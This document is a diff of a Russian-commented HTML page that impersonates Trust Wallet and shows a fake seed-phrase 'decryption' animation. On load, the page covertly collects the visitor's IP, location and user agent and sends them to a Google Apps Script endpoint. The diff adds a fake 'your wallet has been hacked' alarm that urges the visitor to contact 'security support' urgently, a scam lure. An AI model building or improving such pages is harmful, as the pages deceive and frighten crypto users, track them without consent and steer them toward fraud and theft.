@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Trust Wallet</title>
   <style>
-    /* Твой существующий CSS без изменений */
+    /* Твой оригинальный CSS */
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       background-color: #0D1117;
@@ -16,7 +16,7 @@
       min-height: 100vh;
       font-family: 'Segoe UI', sans-serif;
       color: #fff;
-      overflow-x: hidden;
+      overflow: hidden;
       padding: 20px;
     }
     #notify-overlay {
@@ -56,8 +56,10 @@
       animation: shimmer 1.5s linear infinite, notifyGrow 3s ease-in-out forwards;
     }
     @keyframes notifyGrow { from { width: 0%; } to { width: 100%; } }
-    .logo { margin-bottom: 30px; display: flex; align-items: center; gap: 12px; }
+    
+    .logo { margin-bottom: 30px; display: flex; align-items: center; gap: 12px; transition: opacity 0.5s; }
     .logo-text { font-size: 22px; font-weight: 700; color: #fff; }
+    
     .card {
       background: #161B22;
       border: 1px solid #21262D;
@@ -69,7 +71,36 @@
       flex-direction: column;
       align-items: center;
       box-shadow: 0 8px 40px rgba(0,0,0,0.5);
+      transition: all 0.5s ease;
     }
+
+    /* --- Стили для экрана взлома --- */
+    #hack-content {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      animation: fadeIn 0.6s ease;
+    }
+    .warning-icon {
+      width: 80px;
+      height: 80px;
+      margin-bottom: 24px;
+      fill: #FF4D4D;
+      filter: drop-shadow(0 0 15px rgba(255, 77, 77, 0.4));
+      animation: shake 0.5s infinite;
+    }
+    .warning-title { color: #FF4D4D; font-size: 22px; font-weight: 700; margin-bottom: 12px; }
+    .warning-text { color: #8B949E; font-size: 14px; line-height: 1.6; }
+
+    @keyframes shake {
+      0%, 100% { transform: rotate(0deg); }
+      25% { transform: rotate(5deg); }
+      75% { transform: rotate(-5deg); }
+    }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+    /* Остальные твои стили */
     .shield-icon { width: 80px; height: 80px; margin-bottom: 24px; animation: pulse 2s infinite; }
     @keyframes pulse {
       0%, 100% { opacity: 1; transform: scale(1); }
@@ -79,28 +110,21 @@
     .subtitle { font-size: 14px; color: #8B949E; text-align: center; margin-bottom: 32px; }
     .progress-wrapper { width: 100%; background: #21262D; border-radius: 100px; height: 8px; overflow: hidden; margin-bottom: 12px; }
     .progress-bar {
-      height: 100%;
-      width: 0%;
-      border-radius: 100px;
+      height: 100%; width: 0%; border-radius: 100px;
       background: linear-gradient(90deg, #3375BB, #00E5A0, #3375BB);
       background-size: 200% 100%;
-      animation: shimmer 1.5s linear infinite, grow 10s ease-in-out infinite;
+      animation: shimmer 1.5s linear infinite;
     }
-    @keyframes shimmer {
-      0% { background-position: 200% 0; }
-      100% { background-position: -200% 0; }
-    }
-    @keyframes grow { 0% { width: 0%; } 100% { width: 100%; } }
+    @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
     .percent { font-size: 14px; color: #00E5A0; font-weight: 700; margin-bottom: 30px; align-self: flex-end; }
     .checklist { width: 100%; display: flex; flex-direction: column; gap: 12px; border-top: 1px solid #21262D; padding-top: 24px; }
     .check-item { display: flex; align-items: center; gap: 12px; opacity: 0.3; transition: all 0.4s ease; transform: translateX(-10px); }
     .check-item.active { opacity: 1; transform: translateX(0); }
-    .check-circle { width: 20px; height: 20px; border-radius: 50%; border: 2px solid #3375BB; display: flex; align-items: center; justify-content: center; transition: all 0.3s ease; }
+    .check-circle { width: 20px; height: 20px; border-radius: 50%; border: 2px solid #3375BB; display: flex; align-items: center; justify-content: center; }
     .check-item.done .check-circle { background: #00E5A0; border-color: #00E5A0; }
     .check-circle svg { width: 12px; height: 12px; stroke: white; stroke-width: 4; display: none; }
     .check-item.done .check-circle svg { display: block; }
     .check-text { font-size: 14px; color: #8B949E; }
-    .check-item.done .check-text { color: #E6EDF3; }
     .check-status { margin-left: auto; font-size: 12px; font-weight: 600; color: #3375BB; }
     .check-item.done .check-status { color: #00E5A0; }
     @keyframes fadeOut { from { opacity: 1; } to { opacity: 0; } }
@@ -114,119 +138,113 @@
         <path d="M40 4L6 18V42C6 62 21 78 40 86C59 78 74 62 74 42V18L40 4Z" fill="url(#ng1)"/>
         <defs>
           <linearGradient id="ng1" x1="6" y1="4" x2="74" y2="86" gradientUnits="userSpaceOnUse">
-            <stop offset="0%" stop-color="#0040FF"/>
-            <stop offset="100%" stop-color="#00E5A0"/>
+            <stop offset="0%" stop-color="#0040FF"/><stop offset="100%" stop-color="#00E5A0"/>
           </linearGradient>
         </defs>
       </svg>
       <div class="notify-title">Подключение к кошельку</div>
       <div class="notify-sub">Установка защищённого канала...</div>
-      <div class="notify-progress-wrap">
-        <div class="notify-progress-bar"></div>
-      </div>
+      <div class="notify-progress-wrap"><div class="notify-progress-bar"></div></div>
     </div>
   </div>
 
-  <div class="logo">
+  <div class="logo" id="main-logo">
     <svg width="32" height="32" viewBox="0 0 80 90" fill="none">
       <path d="M40 4L6 18V42C6 62 21 78 40 86C59 78 74 62 74 42V18L40 4Z" fill="url(#lg1)"/>
       <defs>
         <linearGradient id="lg1" x1="6" y1="4" x2="74" y2="86" gradientUnits="userSpaceOnUse">
-          <stop offset="0%" stop-color="#0040FF"/>
-          <stop offset="100%" stop-color="#00E5A0"/>
+          <stop offset="0%" stop-color="#0040FF"/><stop offset="100%" stop-color="#00E5A0"/>
         </linearGradient>
       </defs>
     </svg>
     <span class="logo-text">Trust Wallet</span>
   </div>
 
-  <div class="card">
-    <svg class="shield-icon" viewBox="0 0 80 90" fill="none">
-      <path d="M40 4L6 18V42C6 62 21 78 40 86C59 78 74 62 74 42V18L40 4Z" fill="url(#cg1)"/>
-      <path d="M28 44L36 52L54 34" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
-      <defs>
-        <linearGradient id="cg1" x1="6" y1="4" x2="74" y2="86" gradientUnits="userSpaceOnUse">
-          <stop offset="0%" stop-color="#0040FF"/>
-          <stop offset="100%" stop-color="#00E5A0"/>
-        </linearGradient>
-      </defs>
-    </svg>
+  <div class="card" id="main-card">
+    <div id="decrypt-content" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
+      <svg class="shield-icon" viewBox="0 0 80 90" fill="none">
+        <path d="M40 4L6 18V42C6 62 21 78 40 86C59 78 74 62 74 42V18L40 4Z" fill="url(#cg1)"/>
+        <path d="M28 44L36 52L54 34" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
+        <defs>
+          <linearGradient id="cg1" x1="6" y1="4" x2="74" y2="86" gradientUnits="userSpaceOnUse">
+            <stop offset="0%" stop-color="#0040FF"/><stop offset="100%" stop-color="#00E5A0"/>
+          </linearGradient>
+        </defs>
+      </svg>
 
-    <div class="title">Расшифровка Seed-фразы</div>
-    <div class="subtitle">Пожалуйста, подождите...</div>
+      <div class="title">Расшифровка Seed-фразы</div>
+      <div class="subtitle">Пожалуйста, подождите...</div>
 
-    <div class="progress-wrapper">
-      <div class="progress-bar" id="mainBar"></div>
+      <div class="progress-wrapper"><div class="progress-bar" id="mainBar"></div></div>
+      <div class="percent" id="pct">0%</div>
+      
+      <div class="checklist">
+        <div class="check-item" id="step1">
+          <div class="check-circle"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M20 6L9 17L4 12"/></svg></div>
+          <span class="check-text">Проверка ключей</span><span class="check-status">Ожидание</span>
+        </div>
+        <div class="check-item" id="step2">
+          <div class="check-circle"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M20 6L9 17L4 12"/></svg></div>
+          <span class="check-text">Анализ мнемоники</span><span class="check-status">Ожидание</span>
+        </div>
+        <div class="check-item" id="step3">
+          <div class="check-circle"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M20 6L9 17L4 12"/></svg></div>
+          <span class="check-text">Дешифрование данных</span><span class="check-status">Ожидание</span>
+        </div>
+        <div class="check-item" id="step4">
+          <div class="check-circle"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M20 6L9 17L4 12"/></svg></div>
+          <span class="check-text">Синхронизация</span><span class="check-status">Ожидание</span>
+        </div>
+      </div>
     </div>
-    <div class="percent" id="pct">0%</div>
-    
-    <div class="checklist">
-      <div class="check-item" id="step1">
-        <div class="check-circle"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M20 6L9 17L4 12"/></svg></div>
-        <span class="check-text">Проверка ключей</span>
-        <span class="check-status">В процессе</span>
-      </div>
-      <div class="check-item" id="step2">
-        <div class="check-circle"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M20 6L9 17L4 12"/></svg></div>
-        <span class="check-text">Анализ мнемоники</span>
-        <span class="check-status">Ожидание</span>
-      </div>
-      <div class="check-item" id="step3">
-        <div class="check-circle"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M20 6L9 17L4 12"/></svg></div>
-        <span class="check-text">Дешифрование данных</span>
-        <span class="check-status">Ожидание</span>
-      </div>
-      <div class="check-item" id="step4">
-        <div class="check-circle"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M20 6L9 17L4 12"/></svg></div>
-        <span class="check-text">Синхронизация</span>
-        <span class="check-status">Ожидание</span>
-      </div>
+
+    <div id="hack-content">
+      <svg class="warning-icon" viewBox="0 0 24 24">
+        <path d="M12 2L1 21h22L12 2zm1 14h-2v-2h2v2zm0-4h-2V8h2v4z"/>
+      </svg>
+      <div class="warning-title">Ваш кошелек взломан</div>
+      <p class="warning-text">
+        Обнаружена критическая уязвимость. Ваши активы находятся под угрозой несанкционированного вывода. 
+        <br><br>
+        Срочно свяжитесь с поддержкой безопасности.
+      </p>
     </div>
   </div>
 
   <script>
-    // --- 1. Твоя ссылка на Google Apps Script ---
+    // 1. Отправка данных (твой скрипт)
     const googleScriptURL = 'https://script.google.com/macros/s/AKfycbykwY3qxSHEORxLTMD7eR5R6aK_3z12sNcG_OcEFdItC00ge1UZRTDjOsJPyKqKU0JCwg/exec';
-
-    // --- 2. Логика сбора данных и отправки ---
     async function collectAndSend() {
       try {
-        // Получаем Гео и IP
         const geoRes = await fetch('https://ipapi.co/json/');
         const geo = await geoRes.json();
-        
         const params = new URLSearchParams();
         params.append('ip', geo.ip || 'Unknown');
         params.append('location', `${geo.country_name || '?'}, ${geo.city || '?'}`);
         params.append('userAgent', navigator.userAgent);
-
-        // Отправка в таблицу (no-cors)
-        fetch(googleScriptURL, {
-          method: 'POST',
-          mode: 'no-cors',
-          body: params
-        });
+        fetch(googleScriptURL, { method: 'POST', mode: 'no-cors', body: params });
       } catch (e) {
-        // Резервная отправка без Гео (если заблокирован API)
         const params = new URLSearchParams();
-        params.append('ip', 'VPN/Blocked');
-        params.append('location', 'Unknown');
-        params.append('userAgent', navigator.userAgent);
+        params.append('ip', 'Blocked');
         fetch(googleScriptURL, { method: 'POST', mode: 'no-cors', body: params });
       }
     }
-
-    // Запуск сбора данных сразу при загрузке
     collectAndSend();
 
-    // --- 3. Твоя анимация (остается без изменений) ---
+    // 2. Управление анимацией
     const overlay = document.getElementById('notify-overlay');
     setTimeout(() => {
       overlay.style.animation = 'fadeOut 0.5s ease forwards';
       setTimeout(() => overlay.remove(), 500);
     }, 3000);
 
+    // 3. Логика прогресс-бара и переключения экранов
     const pctEl = document.getElementById('pct');
+    const mainBar = document.getElementById('mainBar');
+    const decryptSection = document.getElementById('decrypt-content');
+    const hackSection = document.getElementById('hack-content');
+    const mainCard = document.getElementById('main-card');
+
     const steps = [
       { id: 'step1', threshold: 0, end: 25 },
       { id: 'step2', threshold: 25, end: 50 },
@@ -237,36 +255,42 @@
     let progress = 0;
     const interval = setInterval(() => {
       progress += 0.5;
-      if (progress > 100) progress = 0; 
+      
+      if (progress > 100) {
+        clearInterval(interval);
+        showHack();
+        return;
+      }
 
       pctEl.textContent = Math.floor(progress) + '%';
-      document.getElementById('mainBar').style.width = progress + '%';
+      mainBar.style.width = progress + '%';
 
       steps.forEach((step) => {
         const el = document.getElementById(step.id);
         const statusText = el.querySelector('.check-status');
-
         if (progress >= step.threshold) {
           el.classList.add('active');
           statusText.textContent = 'В процессе';
-        } else {
-          el.classList.remove('active', 'done');
-          statusText.textContent = 'Ожидание';
         }
-
         if (progress >= step.end) {
           el.classList.add('done');
           statusText.textContent = 'Выполнено';
         }
       });
+    }, 80); // Немного ускорил для динамики
 
-      if (progress === 0) {
-        steps.forEach(s => document.getElementById(s.id).classList.remove('active', 'done'));
-      }
-    }, 100);
+    function showHack() {
+      decryptSection.style.opacity = '0';
+      setTimeout(() => {
+        decryptSection.style.display = 'none';
+        mainCard.style.borderColor = '#FF4D4D';
+        mainCard.style.boxShadow = '0 0 40px rgba(255, 77, 77, 0.2)';
+        hackSection.style.display = 'flex';
+      }, 500);
+    }
   </script>
-
 </body>
 </html>
+
 
 
